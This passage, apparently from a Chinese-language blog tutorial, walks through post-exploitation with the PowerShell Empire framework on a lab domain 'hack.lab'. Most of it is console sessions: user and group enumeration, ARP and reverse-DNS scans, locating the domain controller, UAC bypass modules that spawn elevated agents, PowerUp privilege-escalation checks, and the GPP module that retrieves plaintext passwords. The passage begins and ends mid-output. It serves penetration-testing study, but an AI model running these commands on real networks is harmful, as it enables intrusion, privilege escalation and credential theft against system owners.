</span></span><span class="line"><span class="cl"> Techniques   http://attack.mitre.org/techniques/T1082                        
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">┌Record Options───────┬──────────┬────────────────────────────────────┐
</span></span><span class="line"><span class="cl">│ Name     │ Value    │ Required │ Description                        │
</span></span><span class="line"><span class="cl">├──────────┼──────────┼──────────┼────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Agent    │ Y35E4PR8 │ True     │ Agent to run module on.            │
</span></span><span class="line"><span class="cl">├──────────┼──────────┼──────────┼────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Keywords │          │ False    │ Array of keywords to use in file   │
</span></span><span class="line"><span class="cl">│          │          │          │ searches.                          │
</span></span><span class="line"><span class="cl">├──────────┼──────────┼──────────┼────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ UserName │          │ False    │ UserName to enumerate. Defaults to │
</span></span><span class="line"><span class="cl">│          │          │          │ the current user context.          │
</span></span><span class="line"><span class="cl">└──────────┴──────────┴──────────┴────────────────────────────────────┘
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: usemodule/powershell/situational_awareness/host/winenum<span class="o">)</span> &gt; execute
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Tasked Y35E4PR8 to run Task <span class="m">10</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Task <span class="m">10</span> results received
</span></span><span class="line"><span class="cl">Job started: XYW7T5
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Task <span class="m">10</span> results received
</span></span><span class="line"><span class="cl">UserName: lucky
</span></span><span class="line"><span class="cl">-------------------------------------
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">AD Group Memberships
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">-------------------------------------
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Domain Users
</span></span><span class="line"><span class="cl">Users
</span></span><span class="line"><span class="cl">Remote Desktop Users
</span></span></code></pre></div><h3 id="arp扫描">ARP扫描</h3>
<p>只要设置CIDR参数就行了：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>Empire: Y35E4PR8<span class="o">)</span> &gt; usemodule powershell/situational_awareness/network/arpscan
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Set Agent to Y35E4PR8
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> Author       DarkOperator                                                     
</span></span><span class="line"><span class="cl"> Background   True                                                             
</span></span><span class="line"><span class="cl"> Comments     https://github.com/darkoperator/Posh-                            
</span></span><span class="line"><span class="cl">              SecMod/blob/master/Discovery/Discovery.psm1                      
</span></span><span class="line"><span class="cl"> Description  Performs an ARP scan against a given range of IPv4 IP Addresses. 
</span></span><span class="line"><span class="cl"> Language     powershell                                                       
</span></span><span class="line"><span class="cl"> Name         powershell/situational_awareness/network/arpscan                 
</span></span><span class="line"><span class="cl"> NeedsAdmin   False                                                            
</span></span><span class="line"><span class="cl"> OpsecSafe    True                                                             
</span></span><span class="line"><span class="cl"> Software     http://attack.mitre.org/software/S0099                           
</span></span><span class="line"><span class="cl"> Techniques   http://attack.mitre.org/techniques/T1016                         
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">┌Record Options──┬────────────┬──────────┬─────────────────────────────────────┐
</span></span><span class="line"><span class="cl">│ Name           │ Value      │ Required │ Description                         │
</span></span><span class="line"><span class="cl">├────────────────┼────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Agent          │ Y35E4PR8   │ True     │ Agent to run module on.             │
</span></span><span class="line"><span class="cl">├────────────────┼────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ CIDR           │            │ False    │ CIDR to ARP scan.                   │
</span></span><span class="line"><span class="cl">├────────────────┼────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ OutputFunction │ Out-String │ False    │ PowerShell<span class="err">&#39;</span>s output <span class="k">function</span> to use │
</span></span><span class="line"><span class="cl">│                │            │          │ <span class="o">(</span><span class="s2">&#34;Out-String&#34;</span>, <span class="s2">&#34;ConvertTo-Json&#34;</span>,    │
</span></span><span class="line"><span class="cl">│                │            │          │ <span class="s2">&#34;ConvertTo-Csv&#34;</span>, <span class="s2">&#34;ConvertTo-Html&#34;</span>,  │
</span></span><span class="line"><span class="cl">│                │            │          │ <span class="s2">&#34;ConvertTo-Xml&#34;</span><span class="o">)</span>.                   │
</span></span><span class="line"><span class="cl">├────────────────┼────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Range          │            │ False    │ Range to ARP scan.                  │
</span></span><span class="line"><span class="cl">└────────────────┴────────────┴──────────┴─────────────────────────────────────┘
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: usemodule/powershell/situational_awareness/network/arpscan<span class="o">)</span> &gt; <span class="nb">set</span> CIDR 172.16.0.1/24
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Set CIDR to 172.16.0.1/24
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: usemodule/powershell/situational_awareness/network/arpscan<span class="o">)</span> &gt; execute
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Tasked Y35E4PR8 to run Task <span class="m">11</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Task <span class="m">11</span> results received
</span></span><span class="line"><span class="cl">Job started: 61X5W8
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Task <span class="m">11</span> results received
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">MAC               Address     
</span></span><span class="line"><span class="cl">---               -------     
</span></span><span class="line"><span class="cl">F3:B8:9A:2D:5F:D3 172.16.0.101
</span></span><span class="line"><span class="cl">13:7D:DA:AA:AB:E9 172.16.0.102
</span></span><span class="line"><span class="cl">23:CD:C4:85:7C:5D 172.16.0.104
</span></span><span class="line"><span class="cl">03:0C:29:AD:5B:F3 172.16.0.105
</span></span><span class="line"><span class="cl">03:0C:29:7B:D6:46 172.16.0.106
</span></span><span class="line"><span class="cl">13:7D:DA:AA:AB:E9 172.16.0.107
</span></span><span class="line"><span class="cl">03:0C:29:7B:D6:46 172.16.0.255
</span></span></code></pre></div><h3 id="dns信息获取">DNS信息获取</h3>
<p>我们知道机器中IP对应和hostname可以有效分析内网的结构：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>Empire: Y35E4PR8<span class="o">)</span> &gt; usemodule powershell/situational_awareness/network/reverse_dns
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Set Agent to Y35E4PR8
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> Author       DarkOperator                                            
</span></span><span class="line"><span class="cl"> Background   True                                                    
</span></span><span class="line"><span class="cl"> Comments     https://github.com/darkoperator/Posh-                   
</span></span><span class="line"><span class="cl">              SecMod/blob/master/Discovery/Discovery.psm1             
</span></span><span class="line"><span class="cl"> Description  Performs a DNS Reverse Lookup of a given IPv4 IP Range. 
</span></span><span class="line"><span class="cl"> Language     powershell                                              
</span></span><span class="line"><span class="cl"> Name         powershell/situational_awareness/network/reverse_dns    
</span></span><span class="line"><span class="cl"> NeedsAdmin   False                                                   
</span></span><span class="line"><span class="cl"> OpsecSafe    True                                                    
</span></span><span class="line"><span class="cl"> Techniques   http://attack.mitre.org/techniques/T1046                
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">┌Record Options──┬────────────┬──────────┬─────────────────────────────────────┐
</span></span><span class="line"><span class="cl">│ Name           │ Value      │ Required │ Description                         │
</span></span><span class="line"><span class="cl">├────────────────┼────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Agent          │ Y35E4PR8   │ True     │ Agent to run module on.             │
</span></span><span class="line"><span class="cl">├────────────────┼────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ CIDR           │            │ False    │ CIDR to perform reverse DNS on.     │
</span></span><span class="line"><span class="cl">├────────────────┼────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ OutputFunction │ Out-String │ False    │ PowerShell<span class="err">&#39;</span>s output <span class="k">function</span> to use │
</span></span><span class="line"><span class="cl">│                │            │          │ <span class="o">(</span><span class="s2">&#34;Out-String&#34;</span>, <span class="s2">&#34;ConvertTo-Json&#34;</span>,    │
</span></span><span class="line"><span class="cl">│                │            │          │ <span class="s2">&#34;ConvertTo-Csv&#34;</span>, <span class="s2">&#34;ConvertTo-Html&#34;</span>,  │
</span></span><span class="line"><span class="cl">│                │            │          │ <span class="s2">&#34;ConvertTo-Xml&#34;</span><span class="o">)</span>.                   │
</span></span><span class="line"><span class="cl">├────────────────┼────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Range          │            │ False    │ Range to perform reverse DNS on.    │
</span></span><span class="line"><span class="cl">└────────────────┴────────────┴──────────┴─────────────────────────────────────┘
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: usemodule/powershell/situational_awareness/network/reverse_dns<span class="o">)</span> &gt; <span class="nb">set</span> CIDR
</span></span><span class="line"><span class="cl">list assignment index out of range
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: usemodule/powershell/situational_awareness/network/reverse_dns<span class="o">)</span> &gt; <span class="nb">set</span> CIDR 172.16.0.1/24
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Set CIDR to 172.16.0.1/24
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: usemodule/powershell/situational_awareness/network/reverse_dns<span class="o">)</span> &gt; execute
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Task <span class="m">12</span> results received
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">HostName        AddressList                                 
</span></span><span class="line"><span class="cl">--------        -----------                                                                                                     
</span></span><span class="line"><span class="cl">DC.hack.lab     <span class="o">{</span>172.16.0.106<span class="o">}</span>
</span></span></code></pre></div><h3 id="获取域控制器">获取域控制器</h3>
<p>使用下面的命令可以获取到域控所在的位置：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>Empire: Y35E4PR8<span class="o">)</span> &gt; usemodule powershell/situational_awareness/network/reverse_dns
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Set Agent to Y35E4PR8
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> Author       DarkOperator                                            
</span></span><span class="line"><span class="cl"> Background   True                                                    
</span></span><span class="line"><span class="cl"> Comments     https://github.com/darkoperator/Posh-                   
</span></span><span class="line"><span class="cl">              SecMod/blob/master/Discovery/Discovery.psm1             
</span></span><span class="line"><span class="cl"> Description  Performs a DNS Reverse Lookup of a given IPv4 IP Range. 
</span></span><span class="line"><span class="cl"> Language     powershell                                              
</span></span><span class="line"><span class="cl"> Name         powershell/situational_awareness/network/reverse_dns    
</span></span><span class="line"><span class="cl"> NeedsAdmin   False                                                   
</span></span><span class="line"><span class="cl"> OpsecSafe    True                                                    
</span></span><span class="line"><span class="cl"> Techniques   http://attack.mitre.org/techniques/T1046                
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">┌Record Options──┬────────────┬──────────┬─────────────────────────────────────┐
</span></span><span class="line"><span class="cl">│ Name           │ Value      │ Required │ Description                         │
</span></span><span class="line"><span class="cl">├────────────────┼────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Agent          │ Y35E4PR8   │ True     │ Agent to run module on.             │
</span></span><span class="line"><span class="cl">├────────────────┼────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ CIDR           │            │ False    │ CIDR to perform reverse DNS on.     │
</span></span><span class="line"><span class="cl">├────────────────┼────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ OutputFunction │ Out-String │ False    │ PowerShell<span class="err">&#39;</span>s output <span class="k">function</span> to use │
</span></span><span class="line"><span class="cl">│                │            │          │ <span class="o">(</span><span class="s2">&#34;Out-String&#34;</span>, <span class="s2">&#34;ConvertTo-Json&#34;</span>,    │
</span></span><span class="line"><span class="cl">│                │            │          │ <span class="s2">&#34;ConvertTo-Csv&#34;</span>, <span class="s2">&#34;ConvertTo-Html&#34;</span>,  │
</span></span><span class="line"><span class="cl">│                │            │          │ <span class="s2">&#34;ConvertTo-Xml&#34;</span><span class="o">)</span>.                   │
</span></span><span class="line"><span class="cl">├────────────────┼────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Range          │            │ False    │ Range to perform reverse DNS on.    │
</span></span><span class="line"><span class="cl">└────────────────┴────────────┴──────────┴─────────────────────────────────────┘
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: usemodule/powershell/situational_awareness/network/reverse_dns<span class="o">)</span> &gt; <span class="nb">set</span> CIDR
</span></span><span class="line"><span class="cl">list assignment index out of range
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: usemodule/powershell/situational_awareness/network/reverse_dns<span class="o">)</span> &gt; <span class="nb">set</span> CIDR 172.16.0.1/24
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Set CIDR to 172.16.0.1/24
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: usemodule/powershell/situational_awareness/network/reverse_dns<span class="o">)</span> &gt; execute
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Task <span class="m">15</span> results received
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Forest                     : hack.lab
</span></span><span class="line"><span class="cl">CurrentTime                : 2022/1/19 7:58:50
</span></span><span class="line"><span class="cl">HighestCommittedUsn        : <span class="m">12922</span>
</span></span><span class="line"><span class="cl">OSVersion                  : Windows Server <span class="m">2016</span> Datacenter Evaluation
</span></span><span class="line"><span class="cl">Roles                      : <span class="o">{</span>SchemaRole, NamingRole, PdcRole, RidRole...<span class="o">}</span>
</span></span><span class="line"><span class="cl">Domain                     : hack.lab
</span></span><span class="line"><span class="cl">IPAddress                  : fe11::50a4:1bfa:155f:1778%12
</span></span><span class="line"><span class="cl">SiteName                   : Default-First-Site-Name
</span></span><span class="line"><span class="cl">SyncFromAllServersCallback : 
</span></span><span class="line"><span class="cl">InboundConnections         : <span class="o">{}</span>
</span></span><span class="line"><span class="cl">OutboundConnections        : <span class="o">{}</span>
</span></span><span class="line"><span class="cl">Name                       : DC.hack.lab
</span></span><span class="line"><span class="cl">Partitions                 : <span class="o">{</span><span class="nv">DC</span><span class="o">=</span>hack,DC<span class="o">=</span>lab, <span class="nv">CN</span><span class="o">=</span>Configuration,DC<span class="o">=</span>hack,DC<span class="o">=</span>lab, <span class="nv">CN</span><span class="o">=</span>Schema,CN<span class="o">=</span>Configuration,DC<span class="o">=</span>hack,DC<span class="o">=</span>lab
</span></span><span class="line"><span class="cl">                             , <span class="nv">DC</span><span class="o">=</span>DomainDnsZones,DC<span class="o">=</span>hack,DC<span class="o">=</span>lab...<span class="o">}</span>
</span></span></code></pre></div><h2 id="权限提升">权限提升</h2>
<p>empire当然也有内置权限提升的功能，主要是比较常见的Bypass UAC、PowerUP的漏洞检测模块等</p>
<h3 id="bypass-uac">Bypass UAC</h3>
<p>这个功能主要是用户在用户组的时候，主机开启了用户控制，我们可以使用这个功能获取到完全的权限：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">(Empire: VUXT7WBZ) &gt; bypassuac test
</span></span><span class="line"><span class="cl">[*] Tasked VUXT7WBZ to run Task 8
</span></span><span class="line"><span class="cl">[*] Task 8 results received
</span></span><span class="line"><span class="cl">Job started: 5CTNK7
</span></span></code></pre></div><p>执行完毕会在<code>agents</code>列表中出现带星号的就是成功了</p>
<h3 id="bypassuac_wscript">bypassuac_wscript</h3>
<p>这个主要是利用<code>c:\windows\wscript.exe</code>执行payload，只是适用于类似window7的老一点的系统：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>Empire: XR6MK1Y3<span class="o">)</span> &gt; usemodule powershell/privesc/bypassuac_wscript
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Set Agent to XR6MK1Y3
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> Author       @enigma0x3                                                            
</span></span><span class="line"><span class="cl">              @harmyj0y                                                             
</span></span><span class="line"><span class="cl">              Vozzie                                                                
</span></span><span class="line"><span class="cl"> Background   True                                                                  
</span></span><span class="line"><span class="cl"> Comments     http://seclist.us/uac-bypass-vulnerability-in-the-windows-script-     
</span></span><span class="line"><span class="cl">              host.html                                                             
</span></span><span class="line"><span class="cl">              https://github.com/Vozzie/uacscript                                   
</span></span><span class="line"><span class="cl"> Description  Drops wscript.exe and a custom manifest into C:<span class="se">\W</span>indows<span class="se">\ </span>and <span class="k">then</span>     
</span></span><span class="line"><span class="cl">              proceeds to execute VBScript using the wscript executablewith the new 
</span></span><span class="line"><span class="cl">              manifest. The VBScript executed by C:<span class="se">\W</span>indows<span class="se">\w</span>script.exe will run    
</span></span><span class="line"><span class="cl">              elevated.                                                             
</span></span><span class="line"><span class="cl"> Language     powershell                                                            
</span></span><span class="line"><span class="cl"> Name         powershell/privesc/bypassuac_wscript                                  
</span></span><span class="line"><span class="cl"> NeedsAdmin   False                                                                 
</span></span><span class="line"><span class="cl"> OpsecSafe    False                                                                 
</span></span><span class="line"><span class="cl"> Techniques   http://attack.mitre.org/techniques/T1088                              
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">┌Record Options────┬────────────────────┬──────────┬─────────────────────────────────────┐
</span></span><span class="line"><span class="cl">│ Name             │ Value              │ Required │ Description                         │
</span></span><span class="line"><span class="cl">├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Agent            │ XR6MK1Y3           │ True     │ Agent to run module on.             │
</span></span><span class="line"><span class="cl">├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Bypasses         │ mattifestation etw │ False    │ Bypasses as a space separated list  │
</span></span><span class="line"><span class="cl">│                  │                    │          │ to be prepended to the launcher.    │
</span></span><span class="line"><span class="cl">├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Listener         │ <span class="nb">test</span>               │ True     │ Listener to use.                    │
</span></span><span class="line"><span class="cl">├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Obfuscate        │ False              │ False    │ Switch. Obfuscate the launcher      │
</span></span><span class="line"><span class="cl">│                  │                    │          │ powershell code, uses the           │
</span></span><span class="line"><span class="cl">│                  │                    │          │ ObfuscateCommand <span class="k">for</span> obfuscation    │
</span></span><span class="line"><span class="cl">│                  │                    │          │ types. For powershell only.         │
</span></span><span class="line"><span class="cl">├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ ObfuscateCommand │ Token<span class="se">\A</span>ll<span class="se">\1</span>        │ False    │ The Invoke-Obfuscation <span class="nb">command</span> to   │
</span></span><span class="line"><span class="cl">│                  │                    │          │ use. Only used <span class="k">if</span> Obfuscate switch  │
</span></span><span class="line"><span class="cl">│                  │                    │          │ is True. For powershell only.       │
</span></span><span class="line"><span class="cl">├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Proxy            │ default            │ False    │ Proxy to use <span class="k">for</span> request <span class="o">(</span>default,  │
</span></span><span class="line"><span class="cl">│                  │                    │          │ none, or other<span class="o">)</span>.                    │
</span></span><span class="line"><span class="cl">├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ ProxyCreds       │ default            │ False    │ Proxy credentials                   │
</span></span><span class="line"><span class="cl">│                  │                    │          │ <span class="o">([</span>domain<span class="se">\]</span>username:password<span class="o">)</span> to use │
</span></span><span class="line"><span class="cl">│                  │                    │          │ <span class="k">for</span> request <span class="o">(</span>default, none, or      │
</span></span><span class="line"><span class="cl">│                  │                    │          │ other<span class="o">)</span>.                             │
</span></span><span class="line"><span class="cl">├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ UserAgent        │ default            │ False    │ User-agent string to use <span class="k">for</span> the    │
</span></span><span class="line"><span class="cl">│                  │                    │          │ staging request <span class="o">(</span>default, none, or  │
</span></span><span class="line"><span class="cl">│                  │                    │          │ other<span class="o">)</span>.                             │
</span></span><span class="line"><span class="cl">└──────────────────┴────────────────────┴──────────┴─────────────────────────────────────┘
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: usemodule/powershell/privesc/bypassuac_wscript<span class="o">)</span> &gt; execute
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Tasked XR6MK1Y3 to run Task <span class="m">2</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Task <span class="m">2</span> results received
</span></span><span class="line"><span class="cl">Job started: 6TGMCB
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> New agent D6XC87Y9 checked in
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending agent <span class="o">(</span>stage 2<span class="o">)</span> to D6XC87Y9 at 172.16.0.105
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: XR6MK1Y3<span class="o">)</span> &gt; back
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: agents<span class="o">)</span> &gt; list
</span></span></code></pre></div><p>提权成功后会出现星号：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/powershell//13.png" alt="13"></p>
<h3 id="powerup">PowerUP</h3>
<p>Empire内置了PowerUP的部分工具，主要是用于提权比较多，使用<code>allchecks</code>模块：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Job started: MHAKG5
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: VUXT7WBZ<span class="o">)</span> &gt; usemodule powershell/privesc/powerup/allchecks
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Set Agent to VUXT7WBZ
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> Author       @harmj0y                                                           
</span></span><span class="line"><span class="cl"> Background   True                                                               
</span></span><span class="line"><span class="cl"> Comments     https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp 
</span></span><span class="line"><span class="cl"> Description  Runs all current checks <span class="k">for</span> Windows privesc vectors.               
</span></span><span class="line"><span class="cl"> Language     powershell                                                         
</span></span><span class="line"><span class="cl"> Name         powershell/privesc/powerup/allchecks                               
</span></span><span class="line"><span class="cl"> NeedsAdmin   False                                                              
</span></span><span class="line"><span class="cl"> OpsecSafe    True                                                               
</span></span><span class="line"><span class="cl"> Software     http://attack.mitre.org/software/S0194                             
</span></span><span class="line"><span class="cl"> Techniques   http://attack.mitre.org/techniques/T1087                           
</span></span><span class="line"><span class="cl">              http://attack.mitre.org/techniques/T1038                           
</span></span><span class="line"><span class="cl">              http://attack.mitre.org/techniques/T1031                           
</span></span><span class="line"><span class="cl">              http://attack.mitre.org/techniques/T1034                           
</span></span><span class="line"><span class="cl">              http://attack.mitre.org/techniques/T1057                           
</span></span><span class="line"><span class="cl">              http://attack.mitre.org/techniques/T1012                           
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">┌Record Options──┬────────────┬──────────┬─────────────────────────────────────┐
</span></span><span class="line"><span class="cl">│ Name           │ Value      │ Required │ Description                         │
</span></span><span class="line"><span class="cl">├────────────────┼────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Agent          │ VUXT7WBZ   │ True     │ Agent to run module on.             │
</span></span><span class="line"><span class="cl">├────────────────┼────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ OutputFunction │ Out-String │ False    │ PowerShell<span class="err">&#39;</span>s output <span class="k">function</span> to use │
</span></span><span class="line"><span class="cl">│                │            │          │ <span class="o">(</span><span class="s2">&#34;Out-String&#34;</span>, <span class="s2">&#34;ConvertTo-Json&#34;</span>,    │
</span></span><span class="line"><span class="cl">│                │            │          │ <span class="s2">&#34;ConvertTo-Csv&#34;</span>, <span class="s2">&#34;ConvertTo-Html&#34;</span>,  │
</span></span><span class="line"><span class="cl">│                │            │          │ <span class="s2">&#34;ConvertTo-Xml&#34;</span><span class="o">)</span>.                   │
</span></span><span class="line"><span class="cl">└────────────────┴────────────┴──────────┴─────────────────────────────────────┘
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: usemodule/powershell/privesc/powerup/allchecks<span class="o">)</span> &gt; execute
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Tasked VUXT7WBZ to run Task <span class="m">10</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Task <span class="m">10</span> results received
</span></span><span class="line"><span class="cl">Job started: 6VRS1X
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Task <span class="m">10</span> results received
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Running Invoke-AllChecks
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Checking <span class="k">if</span> user is in a <span class="nb">local</span> group with administrative privileges...
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User is in a <span class="nb">local</span> group that grants administrative privileges!
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Run a BypassUAC attack to elevate privileges to admin.
</span></span></code></pre></div><h3 id="gpp">GPP</h3>
<p>GPP是指组策略首选项（Group Policy Preference），GPP通过操作组策略对象GPO（Group Policy Object）对域中的资源进行管理。Freebuf的这篇文章http://www.freebuf.com/vuls/92016.html讲了GPP的应用场景和与之对应的安全问题。</p>
<p>简单来说就是，出于想更新每台主机上本地账户密码的目的，利用GPP可以指定某个域账户为所有计算机的本地计算机管理账户。而这个账号信息存储在<code>\\[Domain Controller]\SYSVOL\[Domain]\Policies</code>中的某个Grouop.xml中，其中的cpassword为AES加密值。但在AD中的所有用户都可以读取Group.xml，对于AES的对称加密，在微软的MSDN上可以查到cpassword使用的固定秘钥（https://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be.aspx），这无疑就是在渗透人员面前的裸奔。</p>
<p>具体可以参考xq17师傅的文章<a href="https://xz.aliyun.com/t/7784">浅析域渗透中的组策略利用</a></p>
<blockquote>
<p>GPP漏洞只在2008没打补丁版本上存在，超过2008版本的系统是没办法写入密码的。</p>
</blockquote>
<p>因为我的域环境是widows server 2016已经打补丁了，所以不能设置密码，下面是这个功能的利用命令：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>Empire: D6XC87Y9<span class="o">)</span> &gt; usemodule powershell/privesc/gpp
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Set Agent to D6XC87Y9
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> Author       @obscuresec                                                            
</span></span><span class="line"><span class="cl"> Background   True                                                                   
</span></span><span class="line"><span class="cl"> Comments     https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration 
</span></span><span class="line"><span class="cl">              /Get-GPPPassword.ps1                                                   
</span></span><span class="line"><span class="cl"> Description  Retrieves the plaintext password and other information <span class="k">for</span> accounts    
</span></span><span class="line"><span class="cl">              pushed through Group Policy Preferences.                               
</span></span><span class="line"><span class="cl"> Language     powershell                                                             
</span></span><span class="line"><span class="cl"> Name         powershell/privesc/gpp                                                 
</span></span><span class="line"><span class="cl"> NeedsAdmin   False                                                                  
</span></span><span class="line"><span class="cl"> OpsecSafe    True                                                                   
</span></span><span class="line"><span class="cl"> Techniques   http://attack.mitre.org/techniques/T1003                               
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">┌Record Options──┬────────────┬──────────┬─────────────────────────────────────┐
</span></span><span class="line"><span class="cl">│ Name           │ Value      │ Required │ Description                         │
</span></span><span class="line"><span class="cl">├────────────────┼────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Agent          │ D6XC87Y9   │ True     │ Agent to run module on.             │
</span></span><span class="line"><span class="cl">├────────────────┼────────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ OutputFunction │ Out-String │ False    │ PowerShell<span class="err">&#39;</span>s output <span class="k">function</span> to use │
